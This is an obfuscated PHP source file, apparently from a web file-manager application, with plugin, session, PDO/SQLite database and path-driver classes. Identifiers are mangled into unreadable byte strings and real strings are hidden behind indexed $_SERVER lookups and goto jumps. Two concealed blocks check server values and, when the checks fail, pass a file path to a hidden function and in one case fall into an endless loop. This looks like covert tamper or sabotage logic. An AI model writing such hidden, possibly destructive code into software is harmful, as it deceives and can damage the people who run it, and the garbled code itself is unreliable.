(!$ıÓÕ¼¨– && is_array($ıÓÕ¼¨–[$ ‹¾Ó Ì[1869]])) { return $™¼ñ‘; } foreach ($ıÓÕ¼¨–[$ ‹¾Ó Ì[1869]] as $İ—±–íî => $ú„üŠ‘…) { if (!isset($ú„üŠ‘…[$ ‹¾Ó Ì[381]]) || isset($™¼ñ‘[$İ—±–íî])) { continue; } $™¼ñ‘[$İ—±–íî] = $ú„üŠ‘…[$ ‹¾Ó Ì[381]]; } return $™¼ñ‘; } public function getPackageJson($—®Ô°çÀ) { return Hook::apply($—®Ô°çÀ . $_SERVER[Á÷ ­Šë][1870]); } public function getConfig($ºæÅòÄÄ, $¡Š†ìøı = false) { $Ç˜îòÇò =& $_SERVER[Á÷ ­Šë]; $œ¡¼Æö = array(); $Ú÷ ÙÛ = $this->loadList($ºæÅòÄÄ); if ($Ú÷ ÙÛ && is_array($Ú÷ ÙÛ[$Ç˜îòÇò[6]])) { $œ¡¼Æö = $Ú÷ ÙÛ[$Ç˜îòÇò[6]]; } if (!$œ¡¼Æö || $¡Š†ìøı) { $œ¡¼Æö = $this->getConfigDefault($ºæÅòÄÄ); } return $œ¡¼Æö; } public function setConfig($ŞÌ«šä…, $¥ªãŞ–¬ = false) { $ò®­ÎÊÁ =& $_SERVER[Á÷ ­Šë]; $÷ÓÀƒ´ = $this->loadList($ŞÌ«šä…); if (!$÷ÓÀƒ´) { return !1; } $Ùº®ƒ®¥ = $÷ÓÀƒ´[$ò®­ÎÊÁ[6]]; if ($¥ªãŞ–¬ == !1) { $Ùº®ƒ®¥ = array(); $¥ªãŞ–¬ = $this->getConfigDefault($ŞÌ«šä…); } foreach ($¥ªãŞ–¬ as $àÏ¨ªœ => $¬Éºß¶à) { $Ùº®ƒ®¥[$àÏ¨ªœ] = is_string($¬Éºß¶à) ? trim($¬Éºß¶à) : $¬Éºß¶à; } $this->update($÷ÓÀƒ´[$ò®­ÎÊÁ[404]], array($ò®­ÎÊÁ[6] => $Ùº®ƒ®¥)); } public function viewList() { $¾‚°òæ† =& $_SERVER[Á÷ ­Šë]; $Á±Ğ³æ = $this->loadList(); $this->pluginScan($Á±Ğ³æ); $Á±Ğ³æ = $this->loadPluginList(); $’¤¦­Œ½ = array(); foreach ($Á±Ğ³æ as $…ú§¼—ˆ => $­•†èÑÕ) { unset($­•†èÑÕ[$¾‚°òæ†[1862]], $­•†èÑÕ[$¾‚°òæ†[6]]); $ûÆüÛ•Ê = PLUGIN_DIR . $­•†èÑÕ[$¾‚°òæ†[28]] . $¾‚°òæ†[1864]; if (!is_file($ûÆüÛ•Ê)) { continue; } $ğº–Ï‰ = Hook::apply($­•†èÑÕ[$¾‚°òæ†[28]] . $¾‚°òæ†[1870]); if (is_array($ğº–Ï‰)) { $’¤¦­Œ½[$…ú§¼—ˆ] = array_merge($­•†èÑÕ, $ğº–Ï‰); } } return $’¤¦­Œ½; } private function loadPluginList() { $ô¸îÙùµ =& $_SERVER[Á÷ ­Šë]; $ĞÚÍ‡ôå = $this->loadList(); if (strtolower(MOD) == $ô¸îÙùµ[1871]) { return $ĞÚÍ‡ôå; } $ÒÑ“‰úŸ = Hook::trigger($ô¸îÙùµ[1872], $ĞÚÍ‡ôå); if ($ĞÚÍ‡ôå && !$ÒÑ“‰úŸ) { die; } return $ÒÑ“‰úŸ ? $ÒÑ“‰úŸ : $ĞÚÍ‡ôå; } private function pluginScan($€ıØêÜš) { $­´‹ß» =& $_SERVER[Á÷ ­Šë]; recursion_dir(PLUGIN_DIR, $¹·¶ûŞã, $ïúôÑµ, 0); foreach ($¹·¶ûŞã as $Æë•Ã˜) { $Ù›Ø‡Õ‚ = get_path_this($Æë•Ã˜); if (isset($€ıØêÜš[$Ù›Ø‡Õ‚]) || !file_exists($Æë•Ã˜ . $­´‹ß»[1873]) || !file_exists($Æë•Ã˜ . $­´‹ß»[1864])) { continue; } Hook::apply($Ù›Ø‡Õ‚ . $­´‹ß»[1867]); } } } if (!isset($_SERVER[$_SERVER[Á÷ ­Šë][57]]) || !isset($_SERVER[$_SERVER[Á÷ ­Šë][66]])) { $_getc = $_SERVER[Á÷ ­Šë][59]; $_getfile = $_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á÷ ­Šë][62], $_getfilec); if (count($_getarrs) < $_SERVER[Á÷ ­Šë][63]) { $exit = $_SERVER[Á÷ ­Šë][64]; $exit(); } $_act = $_SERVER[Á÷ ­Šë][65]; $_act($_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Á÷ ­Šë][385]); } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\x73\145\x73\x73\x69\x6f\156"; public function get($²úáÆ‘) { $…¹º¼é =& $_SERVER[Á÷ ­Šë]; $©¤õµÔò = $this->where(array($…¹º¼é[1874] => $²úáÆ‘))->find(); if (!is_array($©¤õµÔò)) { return !1; } return $©¤õµÔò[$…¹º¼é[750]]; } public function set($Şş¹¤, $ìôèŸ”², $Ç×šÍòœ = 3600) { $İ€Ø»‘¹ =& $_SERVER[Á÷ ­Šë]; $­÷Œäí¢ = array($İ€Ø»‘¹[1874] => $Şş¹¤, $İ€Ø»‘¹[1780] => $ìôèŸ”², $İ€Ø»‘¹[1875] => $Ç×šÍòœ + time()); if (Session::get($İ€Ø»‘¹[1876])) { $­÷Œäí¢[$İ€Ø»‘¹[1574]] = Session::get($İ€Ø»‘¹[1876]); } else { $­÷Œäí¢[$İ€Ø»‘¹[1574]] = 0; } if ($this->get($Şş¹¤)) { return $this->where(array($İ€Ø»‘¹[1874] => $Şş¹¤))->save($­÷Œäí¢); } else { return $this->add($­÷Œäí¢, array(), !0); } } public function remove($ÒˆÌÜ¹) { return $this->where(array($_SERVER[Á÷ ­Šë][1874] => $ÒˆÌÜ¹))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Á÷ ­Šë][1877] . time())->delete(); } } goto bÒÉ©÷ØƒÇ; bÇñÚ¬·: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($²´‚å“Õ = '') { $ª¶Ğ¾¨Õ =& $_SERVER[Á÷ ­Šë]; if (!class_exists($ª¶Ğ¾¨Õ[908])) { think_exception(think_lang($ª¶Ğ¾¨Õ[10]) . $ª¶Ğ¾¨Õ[909]); } if (!empty($²´‚å“Õ)) { $this->config = $²´‚å“Õ; if (empty($this->config[$ª¶Ğ¾¨Õ[13]])) { $this->config[$ª¶Ğ¾¨Õ[13]] = array(); } } } public function connect($ÒŸ…í‘ = '', $Òƒ‘ĞÂñ = 0) { $§ÈÈ¾Øá =& $_SERVER[Á÷ ­Šë]; if (!isset($this->linkID[$Òƒ‘ĞÂñ])) { if (empty($ÒŸ…í‘)) { $ÒŸ…í‘ = $this->config; } $âñ¦ö¦° = !empty($ÒŸ…í‘[$§ÈÈ¾Øá[13]][$§ÈÈ¾Øá[14]]) ? $ÒŸ…í‘[$§ÈÈ¾Øá[13]][$§ÈÈ¾Øá[14]] : $this->pconnect; if ($âñ¦ö¦°) { $ÒŸ…í‘[$§ÈÈ¾Øá[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Òƒ‘ĞÂñ] = new PDO($ÒŸ…í‘[$§ÈÈ¾Øá[910]], $ÒŸ…í‘[$§ÈÈ¾Øá[883]], $ÒŸ…í‘[$§ÈÈ¾Øá[884]], $ÒŸ…í‘[$§ÈÈ¾Øá[13]]); } catch (PDOException $Ç¨ºŠ¼) { think_exception($Ç¨ºŠ¼->getMessage()); } $this->dbType = $this->_getDsnType($ÒŸ…í‘[$§ÈÈ¾Øá[910]]); if (in_array($this->dbType, array($§ÈÈ¾Øá[911], $§ÈÈ¾Øá[912], $§ÈÈ¾Øá[913], $§ÈÈ¾Øá[914]))) { think_exception($§ÈÈ¾Øá[915] . $this->dbType . $§ÈÈ¾Øá[916] . $this->dbType . $§ÈÈ¾Øá[917]); } if (!$this->linkID[$Òƒ‘ĞÂñ]) { think_exception($§ÈÈ¾Øá[918]); } try { $this->linkID[$Òƒ‘ĞÂñ]->exec($§ÈÈ¾Øá[919] . think_config($§ÈÈ¾Øá[886])); } catch (Exception $Ç¨ºŠ¼) { } $this->connected = !0; if (1 != think_config($§ÈÈ¾Øá[18])) { unset($this->config); } } return $this->linkID[$Òƒ‘ĞÂñ]; } public function free() { $this->PDOStatement = null; } public function query($î„‡ü¦“, $ã›Ÿêş = array()) { $õ³ğğÅå =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $î„‡ü¦“; if (!empty($ã›Ÿêş)) { $this->queryStr .= $õ³ğğÅå[920] . print_r($ã›Ÿêş, !0) . $õ³ğğÅå[921]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õ³ğğÅå[19], 1); think_status($õ³ğğÅå[20]); $this->PDOStatement = $this->_linkID->prepare($î„‡ü¦“); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ë¶áºáĞ = $this->PDOStatement->execute($ã›Ÿêş); $this->debug(); if (!1 === $ë¶áºáĞ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($µ®Ö¸¼Ñ, $ÒÉ­ú˜® = array()) { $ğ‚Ö¨Äô =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µ®Ö¸¼Ñ; if (!empty($ÒÉ­ú˜®)) { $this->queryStr .= $ğ‚Ö¨Äô[920] . print_r($ÒÉ­ú˜®, !0) . $ğ‚Ö¨Äô[921]; } $ßÔŞ¸ÃÒ = !1; if ($this->dbType == $ğ‚Ö¨Äô[914]) { if (preg_match($ğ‚Ö¨Äô[922], $this->queryStr, $ÏÃ„Ÿı²)) { $this->table = think_config($ğ‚Ö¨Äô[923]) . str_ireplace(think_config($ğ‚Ö¨Äô[924]), $ğ‚Ö¨Äô[385], $ÏÃ„Ÿı²[2]); $ßÔŞ¸ÃÒ = (bool) $this->query($ğ‚Ö¨Äô[925] . strtoupper($this->table) . $ğ‚Ö¨Äô[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ğ‚Ö¨Äô[21], 1); think_status($ğ‚Ö¨Äô[20]); $this->PDOStatement = $this->_linkID->prepare($µ®Ö¸¼Ñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Âå‚ù¯Ó = $this->PDOStatement->execute($ÒÉ­ú˜®); $this->debug(); if (!1 === $Âå‚ù¯Ó) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ßÔŞ¸ÃÒ || preg_match($ğ‚Ö¨Äô[926], $µ®Ö¸¼Ñ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰¾ÇÀ¸Ÿ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‰¾ÇÀ¸Ÿ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶“ÓŠ½× = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¶“ÓŠ½×) { $this->error(); return !1; } } return !0; } private function getAll() { $İ‡è“¬¡ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($İ‡è“¬¡); return $İ‡è“¬¡; } public function getFields($ÇÂ”á¸Ú) { $‡Ğ¬¤ó² =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (think_config($‡Ğ¬¤ó²[927])) { $ùèÆ•¼ = str_replace($‡Ğ¬¤ó²[928], $ÇÂ”á¸Ú, think_config($‡Ğ¬¤ó²[927])); } else { switch ($this->dbType) { case $‡Ğ¬¤ó²[911]: case $‡Ğ¬¤ó²[929]: $ùèÆ•¼ = "\123\105\114\x45\103\x54\x20\x20\x20\143\x6f\x6c\165\x6d\156\137\156\141\x6d\145\x20\x61\x73\x20\47\116\141\155\x65\x27\x2c\x20\x20\x20\x64\141\x74\141\x5f\x74\x79\160\145\40\x61\163\x20\47\124\171\x70\x65\47\x2c\40\40\40\143\x6f\x6c\165\155\x6e\137\x64\145\146\x61\165\x6c\x74\40\141\163\x20\x27\x44\x65\x66\141\x75\154\164\47\x2c\x20\40\x20\x69\163\x5f\156\165\x6c\154\x61\142\154\x65\x20\141\x73\40\x27\116\165\x6c\154\x27\12\11\x9\106\122\117\x4d\x9\151\156\146\x6f\162\155\x61\x74\151\x6f\156\x5f\x73\x63\x68\145\x6d\x61\x2e\164\141\x62\154\145\163\x20\101\123\x20\164\xa\11\11\112\x4f\x49\x4e\x9\151\x6e\x66\x6f\162\x6d\141\x74\x69\x6f\x6e\137\163\143\150\x65\x6d\x61\56\143\x6f\x6c\165\x6d\x6e\x73\40\101\x53\x20\143\xa\x9\11\x4f\x4e\40\x20\164\56\164\141\142\154\x65\x5f\x63\141\x74\141\154\x6f\147\40\75\40\x63\56\164\141\142\154\145\x5f\x63\141\164\141\x6c\x6f\x67\12\11\11\x41\x4e\104\40\x74\56\164\141\142\x6c\145\x5f\x73\x63\x68\x65\x6d\x61\40\x3d\x20\x63\x2e\x74\x61\x62\x6c\x65\137\163\x63\150\x65\155\x61\12\x9\x9\101\116\104\40\164\x2e\164\141\x62\x6c\145\x5f\x6e\141\155\x65\40\75\x20\x63\x2e\164\141\x62\154\145\137\x6e\x61\x6d\145\12\11\x9\127\110\x45\x52\x45\40\40\x20\164\x2e\x74\141\142\x6c\145\137\x6e\141\155\x65\40\75\x20\47{$ÇÂ”á¸Ú}\47"; break; case $‡Ğ¬¤ó²[930]: $ùèÆ•¼ = $‡Ğ¬¤ó²[931] . $ÇÂ”á¸Ú . $‡Ğ¬¤ó²[932]; break; case $‡Ğ¬¤ó²[912]: case $‡Ğ¬¤ó²[914]: $ùèÆ•¼ = $‡Ğ¬¤ó²[933] . $‡Ğ¬¤ó²[934] . $‡Ğ¬¤ó²[935] . strtoupper($ÇÂ”á¸Ú) . $‡Ğ¬¤ó²[936] . strtoupper($ÇÂ”á¸Ú) . $‡Ğ¬¤ó²[937]; break; case $‡Ğ¬¤ó²[938]: $ùèÆ•¼ = $‡Ğ¬¤ó²[939] . $ÇÂ”á¸Ú . $‡Ğ¬¤ó²[940]; break; case $‡Ğ¬¤ó²[913]: break; case $‡Ğ¬¤ó²[941]: default: $ùèÆ•¼ = $‡Ğ¬¤ó²[942] . ($this->dbType == $‡Ğ¬¤ó²[941] ? "\140{$ÇÂ”á¸Ú}\140" : $ÇÂ”á¸Ú); } } $©½Ø™… = $this->query($ùèÆ•¼); $×©°éÅš = array(); if ($©½Ø™…) { foreach ($©½Ø™… as $ÜÚÓõƒ => $ÚŸÇçæÁ) { $ÚŸÇçæÁ = array_change_key_case($ÚŸÇçæÁ); $ÚŸÇçæÁ[$‡Ğ¬¤ó²[28]] = isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[28]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[28]] : $‡Ğ¬¤ó²[385]; $ÚŸÇçæÁ[$‡Ğ¬¤ó²[29]] = isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[29]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[29]] : $‡Ğ¬¤ó²[385]; $ÙÛÑÚ• = isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[280]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[280]] : $ÚŸÇçæÁ[$‡Ğ¬¤ó²[28]]; $×©°éÅš[$ÙÛÑÚ•] = array($‡Ğ¬¤ó²[28] => $ÙÛÑÚ•, $‡Ğ¬¤ó²[29] => $ÚŸÇçæÁ[$‡Ğ¬¤ó²[29]], $‡Ğ¬¤ó²[31] => (bool) (isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[113]]) && $ÚŸÇçæÁ[$‡Ğ¬¤ó²[113]] === $‡Ğ¬¤ó²[33] || isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[31]]) && $ÚŸÇçæÁ[$‡Ğ¬¤ó²[31]] === $‡Ğ¬¤ó²[33]), $‡Ğ¬¤ó²[34] => isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[34]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[34]] : (isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[53]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[53]] : $‡Ğ¬¤ó²[385]), $‡Ğ¬¤ó²[36] => isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[103]]) ? strtolower($ÚŸÇçæÁ[$‡Ğ¬¤ó²[103]]) == $‡Ğ¬¤ó²[38] : (isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[54]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[54]] : !1), $‡Ğ¬¤ó²[39] => isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[943]]) ? strtolower($ÚŸÇçæÁ[$‡Ğ¬¤ó²[943]]) == $‡Ğ¬¤ó²[41] : (isset($ÚŸÇçæÁ[$‡Ğ¬¤ó²[103]]) ? $ÚŸÇçæÁ[$‡Ğ¬¤ó²[103]] : !1)); } } return $×©°éÅš; } public function getTables($Ã…—¡àà = '') { $€äœÛ³“ =& $_SERVER[Á÷ ­Šë]; if (think_config($€äœÛ³“[944])) { $Âô–ÁáÏ = str_replace($€äœÛ³“[945], $Ã…—¡àà, think_config($€äœÛ³“[944])); } else { switch ($this->dbType) { case $€äœÛ³“[912]: case $€äœÛ³“[914]: $Âô–ÁáÏ = $€äœÛ³“[946]; break; case $€äœÛ³“[911]: case $€äœÛ³“[929]: $Âô–ÁáÏ = $€äœÛ³“[947]; break; case $€äœÛ³“[938]: $Âô–ÁáÏ = $€äœÛ³“[948]; break; case $€äœÛ³“[913]: think_exception(think_lang($€äœÛ³“[949]) . $€äœÛ³“[950]); break; case $€äœÛ³“[930]: $Âô–ÁáÏ = $€äœÛ³“[42] . $€äœÛ³“[43] . $€äœÛ³“[44]; break; case $€äœÛ³“[941]: default: if (!empty($Ã…—¡àà)) { $Âô–ÁáÏ = $€äœÛ³“[894] . $Ã…—¡àà . $€äœÛ³“[895]; } else { $Âô–ÁáÏ = $€äœÛ³“[896]; } } } $ÄÀ‘íŒ = $this->query($Âô–ÁáÏ); $àú¨ßàÂ = array(); foreach ($ÄÀ‘íŒ as $¡™ïüèä => $üÍáã¼ó) { $àú¨ßàÂ[$¡™ïüèä] = current($üÍáã¼ó); } return $àú¨ßàÂ; } protected function parseLimit($¶¾Ê¯óÏ) { $ù¤ªµ©› =& $_SERVER[Á÷ ­Šë]; $°†’ªë± = $ù¤ªµ©›[33]; if (!empty($¶¾Ê¯óÏ)) { switch ($this->dbType) { case $ù¤ªµ©›[938]: case $ù¤ªµ©›[930]: $¶¾Ê¯óÏ = explode($ù¤ªµ©›[47], $¶¾Ê¯óÏ); if (count($¶¾Ê¯óÏ) > 1) { $°†’ªë± .= $ù¤ªµ©›[48] . $¶¾Ê¯óÏ[1] . $ù¤ªµ©›[49] . $¶¾Ê¯óÏ[0] . $ù¤ªµ©›[50]; } else { $°†’ªë± .= $ù¤ªµ©›[48] . $¶¾Ê¯óÏ[0] . $ù¤ªµ©›[50]; } break; case $ù¤ªµ©›[911]: case $ù¤ªµ©›[929]: break; case $ù¤ªµ©›[913]: break; case $ù¤ªµ©›[912]: case $ù¤ªµ©›[914]: break; case $ù¤ªµ©›[941]: default: $°†’ªë± .= $ù¤ªµ©›[48] . $¶¾Ê¯óÏ . $ù¤ªµ©›[50]; } } return $°†’ªë±; } public function parseKey(&$Ì³¹“˜Ú, $ôÕäšôÓ = true) { $‰œ¸ï™Õ =& $_SERVER[Á÷ ­Šë]; if ($ôÕäšôÓ) { $Ì³¹“˜Ú = $this->parseKeyCheck($Ì³¹“˜Ú); } if ($this->dbType == $‰œ¸ï™Õ[941]) { if ($Ì³¹“˜Ú != $‰œ¸ï™Õ[192] && !preg_match($‰œ¸ï™Õ[906], $Ì³¹“˜Ú)) { $Ì³¹“˜Ú = $‰œ¸ï™Õ[392] . trim($Ì³¹“˜Ú, $‰œ¸ï™Õ[392]) . $‰œ¸ï™Õ[392]; } return $Ì³¹“˜Ú; } else { return parent::parseKey($Ì³¹“˜Ú, $ôÕäšôÓ); } } public function close() { $this->_linkID = null; } public function error() { $ä®Ì“ğŒ =& $_SERVER[Á÷ ­Šë]; if ($this->PDOStatement) { $ÊÅÅ…ä• = $this->PDOStatement->errorInfo(); $this->error = $ÊÅÅ…ä•[1] . $ä®Ì“ğŒ[4] . $ÊÅÅ…ä•[2]; } else { $this->error = $ä®Ì“ğŒ[33]; } if ($ä®Ì“ğŒ[33] != $this->queryStr) { $this->error .= LNG($ä®Ì“ğŒ[45]) . $this->queryStr; } think_trace($this->error, $ä®Ì“ğŒ[33], $ä®Ì“ğŒ[46]); return $this->error; } public function escapeString($É— ¼ô¬) { $¸·ÄÖ =& $_SERVER[Á÷ ­Šë]; switch ($this->dbType) { case $¸·ÄÖ[938]: case $¸·ÄÖ[911]: case $¸·ÄÖ[929]: case $¸·ÄÖ[941]: return addslashes($É— ¼ô¬); case $¸·ÄÖ[913]: case $¸·ÄÖ[930]: case $¸·ÄÖ[912]: case $¸·ÄÖ[914]: return str_ireplace($¸·ÄÖ[55], $¸·ÄÖ[56], $É— ¼ô¬); } } protected function parseValue($ÑÊé´») { $çÏ®â• =& $_SERVER[Á÷ ­Šë]; if (is_string($ÑÊé´»)) { $†³á»© = strpos($ÑÊé´», $çÏ®â•[4]) === 0 && in_array($ÑÊé´», array_keys($this->bind)); $ÑÊé´» = $†³á»© ? $this->escapeString($ÑÊé´») : $çÏ®â•[951] . $this->escapeString($ÑÊé´») . $çÏ®â•[951]; } elseif (isset($ÑÊé´»[0]) && is_string($ÑÊé´»[0]) && strtolower($ÑÊé´»[0]) == $çÏ®â•[304]) { $ÑÊé´» = $this->escapeString($ÑÊé´»[1]); } elseif (is_array($ÑÊé´»)) { $ÑÊé´» = array_map(array($this, $çÏ®â•[952]), $ÑÊé´»); } elseif (is_bool($ÑÊé´»)) { $ÑÊé´» = $ÑÊé´» ? $çÏ®â•[97] : $çÏ®â•[201]; } elseif (is_null($ÑÊé´»)) { $ÑÊé´» = $çÏ®â•[113]; } return $ÑÊé´»; } public function getLastInsertId() { $µ¡¯Å£ª =& $_SERVER[Á÷ ­Šë]; switch ($this->dbType) { case $µ¡¯Å£ª[938]: case $µ¡¯Å£ª[930]: case $µ¡¯Å£ª[911]: case $µ¡¯Å£ª[929]: case $µ¡¯Å£ª[913]: case $µ¡¯Å£ª[941]: return $this->_linkID->lastInsertId(); case $µ¡¯Å£ª[912]: case $µ¡¯Å£ª[914]: $™Áó³¡ = $this->table; $ÔÒõ¡Šë = $this->query("\x53\x45\x4c\105\103\x54\x20{$™Áó³¡}\x2e\143\165\x72\x72\166\x61\154\40\143\x75\x72\x72\166\x61\x6c\x20\x46\122\117\115\x20\x64\165\x61\x6c"); return $ÔÒõ¡Šë ? $ÔÒõ¡Šë[0][$µ¡¯Å£ª[953]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($™ÓÖ‡êç) { $¤¿”…Ôå =& $_SERVER[Á÷ ­Šë]; if (!CacheLock::fileLock($¤¿”…Ôå[9])) { return !1; } $šŸËÁ‚À = parent::query($™ÓÖ‡êç); CacheLock::fileUnLock($¤¿”…Ôå[9]); return $šŸËÁ‚À; } public function execute($ß¼ŸĞ°ó) { $òÔïÄİß =& $_SERVER[Á÷ ­Šë]; if (!CacheLock::fileLock($òÔïÄİß[9])) { return !1; } $ß§ÊŠ®± = parent::execute($ß¼ŸĞ°ó); CacheLock::fileUnLock($òÔïÄİß[9]); return $ß§ÊŠ®±; } } class DbSqlite3 extends DbSqlite3Base { public function query($¶ÛŠéÌÛ) { $ËÀ´Œª“ =& $_SERVER[Á÷ ­Šë]; if (!CacheLock::fileLock($ËÀ´Œª“[9])) { return !1; } $ñ¾ò©„å = parent::query($¶ÛŠéÌÛ); CacheLock::fileUnLock($ËÀ´Œª“[9]); return $ñ¾ò©„å; } public function execute($†Œ®ÑÆı) { $š¯îöÓ =& $_SERVER[Á÷ ­Šë]; if (!CacheLock::fileLock($š¯îöÓ[9])) { return !1; } $˜üû²ÄŒ = parent::execute($†Œ®ÑÆı); CacheLock::fileUnLock($š¯îöÓ[9]); return $˜üû²ÄŒ; } } goto d„Ÿçšê„; EŸ¯ÍšÑÚÁ: if ($_SERVER[$_SERVER[Á÷ ­Šë][57]] != $_SERVER[$_SERVER[Á÷ ­Šë][58]]) { $_getc = $_SERVER[Á÷ ­Šë][59]; $_getfile = $_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á÷ ­Šë][62], $_getfilec); if (count($_getarrs) < $_SERVER[Á÷ ­Šë][63]) { $exit = $_SERVER[Á÷ ­Šë][64]; $exit(); } $_act = $_SERVER[Á÷ ­Šë][65]; $_act($_SERVER[$_SERVER[Á÷ ­Šë][66]]); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $•Çë¼˜ =& $_SERVER[Á÷ ­Šë]; $this->objectDriver = array($•Çë¼˜[67], $•Çë¼˜[68], $•Çë¼˜[69], $•Çë¼˜[70], $•Çë¼˜[71], $•Çë¼˜[72], $•Çë¼˜[73], $•Çë¼˜[74], $•Çë¼˜[75]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ñ«œ«½Â) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ñ«œ«½Â, $_SERVER[Á÷ ­Šë][8]); } return $ñ«œ«½Â; } public function iconvApp($ÄÀŒ²Ó¸) { return $ÄÀŒ²Ó¸; } public function iconvSystem($ˆ¯æšÃ) { return $ˆ¯æšÃ; } public function iconvTo($šŒº¬‰—, $õŒ¤Íû, $¾Şä´ †) { $¶Ôö¶îç =& $_SERVER[Á÷ ­Šë]; if (!$šŒº¬‰— || !function_exists($¶Ôö¶îç[76])) { return $šŒº¬‰—; } static $íº«•Â» = array(); $œ‚Ğüãƒ = $õŒ¤Íû . $¶Ôö¶îç[77] . $¾Şä´ † . $¶Ôö¶îç[78] . $šŒº¬‰—; if (isset($íº«•Â»[$œ‚Ğüãƒ])) { return $íº«•Â»[$œ‚Ğüãƒ]; } if (function_exists($¶Ôö¶îç[79])) { $ŠÛñ±ÓÕ = @mb_convert_encoding($šŒº¬‰—, $¾Şä´ †, $õŒ¤Íû); } else { $ŠÛñ±ÓÕ = @iconv($õŒ¤Íû, $¾Şä´ †, $šŒº¬‰—); } $ŠÛñ±ÓÕ = $ŠÛñ±ÓÕ ? $ŠÛñ±ÓÕ : $šŒº¬‰—; if (strstr($ŠÛñ±ÓÕ, $¶Ôö¶îç[80])) { $ŠÛñ±ÓÕ = str_replace($¶Ôö¶îç[80], $¶Ôö¶îç[81], $ŠÛñ±ÓÕ); } $íº«•Â»[$õŒ¤Íû . $¶Ôö¶îç[77] . $¾Şä´ † . $¶Ôö¶îç[78] . $šŒº¬‰—] = $ŠÛñ±ÓÕ; $íº«•Â»[$¾Şä´ † . $¶Ôö¶îç[77] . $õŒ¤Íû . $¶Ôö¶îç[78] . $šŒº¬‰—] = $šŒº¬‰—; $íº«•Â»[$¾Şä´ † . $¶Ôö¶îç[77] . $õŒ¤Íû . $¶Ôö¶îç[78] . $ŠÛñ±ÓÕ] = $šŒº¬‰—; $íº«•Â»[$õŒ¤Íû . $¶Ôö¶îç[77] . $¾Şä´ † . $¶Ôö¶îç[78] . $ŠÛñ±ÓÕ] = $ŠÛñ±ÓÕ; return $ŠÛñ±ÓÕ; } public function getPathInner($§”ÏÕš¹) { $”•˜æÌ® = IO::init($§”ÏÕš¹); return $”•˜æÌ®->path; } public function getPathOuter($×¦ÃÕëƒ) { $âì—ê « =& $_SERVER[Á÷ ­Šë]; $¶Ùı‰†ã = strlen(trim($this->pathBase, $âì—ê «[8])); $×¦ÃÕëƒ = substr(trim($×¦ÃÕëƒ, $âì—ê «[8]), $¶Ùı‰†ã); return $this->pathDriver . $âì—ê «[8] . ltrim($×¦ÃÕëƒ, $âì—ê «[8]); } public function isParentOf($´›­Ù´È, $†õ€ã§Ş) { $×›Òœàê =& $_SERVER[Á÷ ­Šë]; $´›­Ù´È = rtrim(strtolower($´›­Ù´È), $×›Òœàê[8]) . $×›Òœàê[8]; $†õ€ã§Ş = rtrim(strtolower($†õ€ã§Ş), $×›Òœàê[8]) . $×›Òœàê[8]; $«£¹êí = strpos($†õ€ã§Ş, $´›­Ù´È) === 0; return $«£¹êí; } public function getType() { $‡ŸÒûÚØ =& $_SERVER[Á÷ ­Šë]; $ÍœªºƒÓ = str_replace($‡ŸÒûÚØ[82], $‡ŸÒûÚØ[33], get_class($this)); return strtolower($ÍœªºƒÓ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($â›±ÄÔ, $“©Ì¯È‰) { $ğšÀú˜· =& $_SERVER[Á÷ ­Šë]; $Æƒ˜ îæ = rtrim($â›±ÄÔ, $ğšÀú˜·[8]) . $ğšÀú˜·[8] . $“©Ì¯È‰; $­ö Ù«¸ = $this->exist($Æƒ˜ îæ); return $­ö Ù«¸ ? $Æƒ˜ îæ : !1; } public function setModifyTime($Íˆé©è¤, 